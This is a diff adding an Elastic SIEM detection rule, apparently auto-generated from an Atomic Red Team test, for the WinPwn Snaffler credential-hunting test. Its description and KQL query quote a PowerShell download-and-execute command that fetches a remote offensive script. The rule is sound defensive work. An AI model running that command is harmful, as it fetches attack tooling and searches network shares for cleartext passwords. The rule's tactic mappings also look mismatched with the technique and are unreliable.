@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'WinPwn - Snaffler' (GUID: fdd0c913-714b-4c13-b40f-1824d6c015f2) of technique T1552.001 (Unsecured Credentials: Credentials In Files). Test Description: Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn. Command/Steps: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn...."
+from = "now-9m"
+rule_id = "21fbe8c1-d0fe-4393-b7b7-80a4d4d5e5b9"
+language = "kql"
+name = "Atomic Test: T1552.001 - WinPwn - Snaffler"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1552.001/T1552.001.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1552.001", "fdd0c913-714b-4c13-b40f-1824d6c015f2", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*iex(new-object*\\\" AND powershell.script_block_text : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')*\\\" AND powershell.script_block_text : \\\"*Snaffler*\\\" OR (process.command_line : \\\"*iex(new-object*\\\" AND process.command_line : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')*\\\" AND process.command_line : \\\"*Snaffler*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1552.001"
+name = "WinPwn - Snaffler"
+reference = "https://attack.mitre.org/techniques/T1552/001"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1552/001"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1552/001"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1552/001"
+
+
